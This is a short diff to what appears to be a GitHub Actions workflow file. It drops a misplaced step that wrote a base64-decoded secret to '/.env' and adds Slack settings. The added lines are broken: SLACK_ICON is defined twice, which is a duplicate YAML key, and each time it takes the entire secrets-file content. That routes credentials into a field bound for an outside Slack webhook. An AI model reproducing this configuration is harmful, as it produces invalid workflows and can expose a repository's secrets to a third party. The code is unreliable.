@@ -16,10 +16,12 @@ permissions:
 
 jobs:
   build:
-    runs-on: ubuntu-latest
-    - run: echo $SECRETS_FILE_CONTENT | base64 -d > '/.env'
+    
     env:
-      SECRETS_FILE_CONTENT: ${{ secrets.SECRETS_FILE_CONTENT }}
+      SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
+      SLACK_ICON: ${{ secrets.SECRETS_FILE_CONTENT }}
+      SLACK_ICON: ${{ secrets.SECRETS_FILE_CONTENT }}
+    runs-on: ubuntu-latest
 
     steps:
     - uses: actions/checkout@v3
